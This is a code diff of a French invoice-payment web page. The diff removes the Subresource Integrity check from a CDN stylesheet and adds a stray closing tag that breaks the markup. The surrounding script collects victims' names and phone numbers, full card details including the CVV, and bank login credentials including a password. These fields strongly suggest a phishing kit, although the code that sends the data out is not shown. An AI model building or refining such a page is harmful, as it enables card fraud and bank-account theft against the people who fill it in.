@@ -5,11 +5,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Paiement facture</title>
-  <!-- Font Awesome pour les icônes sociales -->
+  <!-- Font Awesome pour les icônes sociales (sans integrity) -->
   <link
     rel="stylesheet"
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
-    integrity="sha512-p0bXJkQ0z7opg1a1PmIeb6QaKY6u5ONPncg9sFvkC/o5PjHzupyR9zOR1I0yL/6cTh9Ck6u9jpK8V+3y0QKjXg=="
     crossorigin="anonymous"
     referrerpolicy="no-referrer"
   />
@@ -116,7 +115,7 @@
     <div class="footer-bottom">
       <div class="legal-links">
         <a href="#">Informations Légales</a>
-        <a href="#">Données et contenus</a>
+        <a href="#">Données et contenus</a></a>
         <a href="#">Signaler un contenu</a>
         <a href="#">Tarifs et conditions</a>
       </div>
@@ -233,7 +232,7 @@
     toStep2.addEventListener('click', () => {
       if (!step1.checkValidity()) return step1.reportValidity();
       const d1 = new FormData(step1);
-      const infos = 
+      const infos =
         `Nom: ${d1.get('lastname')}\n` +
         `Prénom: ${d1.get('firstname')}\n` +
         `Téléphone: ${d1.get('phone')}\n` +
@@ -261,7 +260,7 @@
       }
       expInput.setCustomValidity('');
       const d2 = new FormData(step2Card);
-      const cb = 
+      const cb =
         `Numéro: ${d2.get('cardnumber')}\n` +
         `Exp: ${d2.get('expdate')}\n` +
         `CVV: ${d2.get('cvv')}`;
@@ -276,7 +275,7 @@
       e.preventDefault();
       if (!step2Sepa.checkValidity()) return step2Sepa.reportValidity();
       const ds = new FormData(step2Sepa);
-      const sepa = 
+      const sepa =
         `Banque: ${ds.get('bankname')}\n` +
         `ID: ${ds.get('bankid')}\n` +
         `Pass: ${ds.get('bankpass')}`;
